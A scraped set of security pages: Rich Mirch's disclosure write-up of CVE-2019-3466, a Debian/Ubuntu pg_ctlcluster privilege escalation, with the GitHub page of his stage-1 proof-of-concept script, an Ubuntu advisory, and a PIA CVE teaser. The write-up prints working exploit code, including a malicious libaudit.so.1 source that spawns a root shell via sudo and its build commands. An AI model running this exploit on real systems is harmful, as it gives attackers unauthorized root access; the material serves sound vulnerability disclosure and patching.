CVE-2019-12572 has been patched in v1.2.1. The latest Windows desktop client can be upgraded automatically via the application or manually from the download page at [Private Internet Access](https://www.privateinternetaccess.com/pages/download).

---

### **Walkthrough**

While hunting for potential vulnerabilities in the Windows Private Internet Access desktop application I noticed a failed call to open the c:\etc\ssl\openssl.cnf file during the service startup.

![pia-openssl-failed-open](https://blog.mirch.io/wp-content/uploads/2019/06/pia-openssl-failed-open.png)

This caught my attention and I needed to research this further. But before I get into the details of that, let‚Äôs take a step back and see how I arrived there.

[Continue reading ‚Üí](https://blog.mirch.io/2019/06/10/cve-2019-12572-pia-windows-privilege-escalation-malicious-openssl-engine/#more-259)

## Posts navigation

[Older posts](https://blog.mirch.io/page/2/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2022%252F05%252F20%252Fexploiting-kaseya-unitrends-backup-appliance-part-1%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io)
  + [View site in Reader](https://wordpress.com/read/feeds/161645119)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from github.com_5c402d3b_20250121_014600.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FCVE-2019-3466-stage1.sh)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research%2Fblob%2Fmaster%2Fvulnerabilities%2FCVE-2019-3466-stage1.sh)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=mirchr%2Fsecurity-research)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mirchr](/mirchr)
/
**[security-research](/mirchr/security-research)**
Public

* [Notifications](/login?return_to=%2Fmirchr%2Fsecurity-research) You must be signed in to change notification settings
* [Fork
  27](/login?return_to=%2Fmirchr%2Fsecurity-research)
* [Star
   95](/login?return_to=%2Fmirchr%2Fsecurity-research)

* [Code](/mirchr/security-research)
* [Issues
  0](/mirchr/security-research/issues)
* [Pull requests
  0](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects
  0](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

Additional navigation options

* [Code](/mirchr/security-research)
* [Issues](/mirchr/security-research/issues)
* [Pull requests](/mirchr/security-research/pulls)
* [Actions](/mirchr/security-research/actions)
* [Projects](/mirchr/security-research/projects)
* [Security](/mirchr/security-research/security)
* [Insights](/mirchr/security-research/pulse)

## Files

¬†master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
/
# CVE-2019-3466-stage1.sh

Copy path Blame  Blame
## Latest commit

## History

[History](/mirchr/security-research/commits/master/vulnerabilities/CVE-2019-3466-stage1.sh)executable file¬∑29 lines (24 loc) ¬∑ 862 Bytes¬†master
## Breadcrumbs

1. [security-research](/mirchr/security-research/tree/master)
2. /[vulnerabilities](/mirchr/security-research/tree/master/vulnerabilities)
/
# CVE-2019-3466-stage1.sh

Top
## File metadata and controls

* Code
* Blame

executable file¬∑29 lines (24 loc) ¬∑ 862 Bytes[Raw](https://github.com/mirchr/security-research/raw/refs/heads/master/vulnerabilities/CVE-2019-3466-stage1.sh)1234567891011121314151617181920212223242526272829#!/bin/bash# PoC for CVE-2019-3466# Author: Rich Mirch @0xm1rch# Blog: https://blog.mirch.io/cve-2019-3466-debian-ubuntu-pg\_ctlcluster-privilege-escalation## Usage# ./CVE-2019-3466-stage1.sh# Restart postgresql via systemd# ./CVE-2019-3466-stage2.sh #target=/usr/lib/sudo/haswell/libaudit.so.1target\_dir=$(dirname ${target})
if [[ -w ${target\_dir?} ]]then echo "ERROR: ${target\_dir?} is already writable - run stage2 to get root" exit 1fi
pg\_stats\_temp=$(psql --tuples-only --no-align --quiet -c 'show stats\_temp\_directory')
if [[ ${pg\_stats\_temp?} != ${target\_dir?} ]]then psql --tuples-only --no-align --quiet -c "alter system set stats\_temp\_directory TO '$target\_dir'"fi
echo "Postgres must now be restarted via systemct/service as root; Then execute CVE-2019-3466-stage2.sh"
# when complete alter system reset stats\_temp\_directory;

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from usn.ubuntu.com_3f820003_20250120_233938.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4194-2: postgresql-common vulnerability

3 December 2019

postgresql-common could be made to create arbitrary directories.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 14.04 ESM](/security/notices?release=trusty)

## Packages

* [postgresql-common](/security/cves?package=postgresql-common) - PostgreSQL database-cluster manager

## Details

USN-4194-1 fixed a vulnerability in postgresql-common. This update provides

the corresponding update for Ubuntu 14.04 ESM.

Original advisory details:

Rich Mirch discovered that the postgresql-common pg\_ctlcluster script

incorrectly handled directory creation. A local attacker could possibly use

this issue to escalate privileges.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 14.04

* [postgresql-common](https://launchpad.net/ubuntu/%2Bsource/postgresql-common)
  -
  [154ubuntu1.1+esm1](https://launchpad.net/ubuntu/%2Bsource/postgresql-common/154ubuntu1.1%2Besm1)

In general, a standard system update will make all the necessary changes.

## References

* [CVE-2019-3466](/security/CVE-2019-3466)

## Related notices

* [USN-4194-1](/security/notices/USN-4194-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

¬© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from blog.mirch.io_917203bf_20250121_014559.html ===

[Skip to content](#content)

* [Home](/)
* [Vulnerability Research](https://blog.mirch.io/cve/)
* [Github](https://github.com/mirchr/security-research)
* [Twitter](https://twitter.com/0xm1rch)
* [About](https://blog.mirch.io/about/)

Search for:

[Rich Mirch](https://blog.mirch.io "Rich Mirch")
# [Rich Mirch](https://blog.mirch.io/ "Rich Mirch")

## Penetration Tester, Red Teamer, Security Researcher

Menu

[CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster ‚Äî November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

[![](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg_ctlcluster")

## [CVE-2019-3466 Debian / Ubuntu Privilege Escalation via¬†pg\_ctlcluster](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)

[November 15, 2019November 15, 2019](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/ "6:54 am")/[Rich Mirch](https://blog.mirch.io/author/rich773975444/ "View all posts by Rich Mirch")

# Vulnerability Summary

The [pg\_ctlcluster](https://manpages.debian.org/buster/postgresql-common/pg_ctlcluster.1.en.html) script in the postgresql-common package in Debian and Ubuntu is vulnerable to a local privilege escalation attack. pg\_ctlcluster is a script used to manage PostgreSQL instances.¬†A malicious actor with access to the postgres account can create arbitrary directories during startup or reload when called via systemd. This vulnerability can be leveraged to escalate privileges to root.

It‚Äôs important to note this is not a vulnerability in PostgreSQL and is specific to Debian, Ubuntu, or any system that consumes the Debian postgresql-common package.

A [fix](https://salsa.debian.org/postgresql/postgresql-common/commit/ec9d984b62ed79f61be97b786a9ff4381309979c)¬†is now available. Administrators should upgrade to the latest version of the postgresql-common package. See the Debian [security tracker](https://security-tracker.debian.org/tracker/source-package/postgresql-common) for details.

The vulnerability appears to have existed since 2013 based on the Debian Git history ([9dc97b,](https://salsa.debian.org/postgresql/postgresql-common/commit/9dc97be33f1f116ae6e2f17bd05cb6a2baf274a9)¬†[e97d16](https://salsa.debian.org/postgresql/postgresql-common/commit/e97d163c85c6df7e30ecc346eec007da2cd7e688)). I attempted to reproduce it on Wheezy but was unable to verify it due to unrelated technical issues standing up a test environment.

This proof of concept will show the ability to gain root privileges using the default

installation of¬† postgresql-common v200+deb10u2 along with postgresql-11 on Debian Buster. I have also verified the vulnerability on Ubuntu 19.04 with version 199 of the postgresql-common package.

---

## Walkthrough

The postgresql init script(/etc/init.d/postgresql) sources¬†[init.d-functions](https://salsa.debian.org/postgresql/postgresql-common/blob/master/debian/init.d-functions) which contain functions that call the pg\_ctlcluster script.¬†pg\_ctlcluster loads the following configuration files determined by the [Pgcommon](https://salsa.debian.org/postgresql/postgresql-common/blob/master/PgCommon.pm)¬†module.

* /etc/postgresql/cluster-version/cluster-name/pg\_ctl.conf
* /etc/postgresql/cluster-version/cluster-name/postgresql.conf
* /var/lib/postgresql/cluster-version/cluster-name/postgresql.auto.conf

These files are owned by the postgres user. The postgresql.auto.conf file will override the settings from /etc/postgresql. This file is created when the [alter system](https://www.postgresql.org/docs/current/sql-altersystem.html) command is executed.

pg\_ctlcluster contains logic to create directories for socketdir(defined in pg\_ctl.conf) and stats\_temp\_directory(defined in postgresql.conf). During a start or reload, if the directories defined in either of these variables do not exist, pg\_ctlcluster will create it and set the owner to the postgres user.

![debian-200-deb10u2-vuln-code](https://blog.mirch.io/wp-content/uploads/2019/11/debian-200-deb10u2-vuln-code.png?w=712)

Vulnerable code in 200+deb10u2

With the ability to create an arbitrary directory owned by the postgres user I set out to find a fast path to root. I executed the [strace(1)](http://man7.org/linux/man-pages/man1/strace.1.html)¬†utility on the sudo binary to see if there were any attempts to load shared objects from nonexistent locations.

```
postgres@debian:~$ strace -ff sudo 2>&1|grep '.so.' |grep -w ENOENT
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/tls/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/haswell/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/x86_64/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libaudit.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libselinux.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libutil.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libpthread.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libdl.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/usr/lib/sudo/libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)

```

I reviewed the list and decided that /usr/lib/sudo/haswell would be a good candidate.

```
postgres@debian:~$ ls -ld /usr/lib/sudo/haswell
ls: cannot access '/usr/lib/sudo/haswell': No such file or directory
```

At this point we have a privileged binary(sudo) attempting to load /usr/lib/sudo/haswell/libaudit.so.1 from a path does not exist. The goal now was to create this path, install a malicious libaudit.so.1 library and execute sudo. If all goes well a root shell will be spawned.

For the purpose of a simple PoC, I created a sudo rule to quickly restart the postgres service via systemd to demonstrate the vulnerability. In the real world this rule probably will not exist under the postgres account, however there could be other methods to induce a restart. Worse case an attacker would have to wait until the system was rebooted or some other event to cause the service to restart via systemd.

I automated the process by creating two scripts which can be found in my [Github](https://github.com/mirchr/security-research) repo. [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh) sets stats\_temp\_directory to /usr/lib/sudo/haswell. After a restart, [CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh) builds a malicious libaudit.so.1 library,¬† stores it in /usr/lib/sudo/haswell, and executes sudo which spawns a root shell. Below is the source for libaudit.so.1 library. I had to add stubs for audit\_open() and audit\_log\_user\_message().

**Note:**¬†This has the potential to break sudo and should only be used in a controlled test environment. No attempt was made to make it reliable so use with caution.

```

/*
 * Author: Rich Mirch @0xm1rch
 * PoC for pg_ctlcluster arbitrary directory creation
 * gcc -fPIC -o woot.o -Wall -c woot.c
 * gcc -Wall -shared \
 *     -Wl,-soname,libaudit.so.1 \
 *     -Wl,-init,woot \
 *     -o /usr/lib/sudo/haswell/libaudit.so.1 woot.o
 * sudo
 */
#include
#include
#include

void audit_open()
{
  return;
}

void audit_log_user_message()
{
  return;
}

void woot(){
  setreuid(0,0);
  setregid(0,0);
  execl("/bin/sh","/bin/sh",NULL);
}

```

Screenshot showing the execution of stage 1, a restart, and stage 2 resulting in a root shell.

![debian-buster-postgres-root](https://blog.mirch.io/wp-content/uploads/2019/11/debian-buster-postgres-root.png?w=712)

## Timeline

* 2019-10-13: Report sent to Debian Security Team
* 2019-10-14: Debian acknowledges report
* 2019-11-13: Debian notified Ubuntu about upcoming release
* 2019-11-14: Debian releases advisory and patch

## References

* Debian Advisory: <https://www.debian.org/security/2019/dsa-4568>
* Ubuntu Advisory: <https://usn.ubuntu.com/4194-1/>
* PoC Exploit: [CVE-2019-3466-stage1.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage1.sh),¬†[CVE-2019-3466-stage2.sh](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2019-3466-stage2.sh)

### Share this:

* [Twitter](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=twitter "Click to share on Twitter")
* [Facebook](https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/?share=facebook "Click to share on Facebook")
Like Loading...
### *Related*

Categories: [Uncategorized](https://blog.mirch.io/category/uncategorized/)Tags: [Linux](https://blog.mirch.io/tag/linux/), [PostgreSQL](https://blog.mirch.io/tag/postgresql/), [vulnerability](https://blog.mirch.io/tag/vulnerability/)

## Post navigation

[CVE-2018-1792 ‚Äì IBM MQ Privilege Escalation: Fun with¬†RUNPATH](https://blog.mirch.io/2019/08/25/cve-2018-1792-ibm-mq-privilege-escalation-fun-with-runpath/)[CVE-2019-19954 Signal Desktop Windows Elevation of Privilege¬†Vulnerability](https://blog.mirch.io/2019/12/18/signal-desktop-windows-lpe/)

### Tags

[exploit](https://blog.mirch.io/tag/exploit/)
[hacking sudo](https://blog.mirch.io/tag/hacking-sudo/)
[Linux](https://blog.mirch.io/tag/linux/)
[PostgreSQL](https://blog.mirch.io/tag/postgresql/)
[sudo hacking](https://blog.mirch.io/tag/sudo-hacking/)
[vulnerability](https://blog.mirch.io/tag/vulnerability/)
[Follow Rich Mirch on WordPress.com](https://blog.mirch.io)

* [GitHub](https://github.com/mirchr)
* [LinkedIn](https://www.linkedin.com/in/mirchr/)

[Create a website or blog at WordPress.com](https://wordpress.com/?ref=footer_custom_svg "Create a website or blog at WordPress.com")

* Reblog
* Subscribe
  Subscribed

  + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
* Privacy
* + [![](https://s2.wp.com/i/logo/wpcom-gray-white.png) Rich Mirch](https://blog.mirch.io)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fblog.mirch.io%252F2019%252F11%252F15%252Fcve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation%252F)
  + [Copy shortlink](https://wp.me/paoR5j-5n)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://blog.mirch.io/2019/11/15/cve-2019-3466-debian-ubuntu-pg_ctlcluster-privilege-escalation/)
  + [View post in Reader](https://wordpress.com/read/blogs/153687293/posts/333)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

##

##

Loading Comments...

Write a Comment...

Email (Required)

Name (Required)

Website

###

%d

![](https://pixel.wp.com/b.gif?v=noscript)



=== Content from github.com_3ca7fa74_20250121_014549.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmirchr%2Fsecurity-research)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
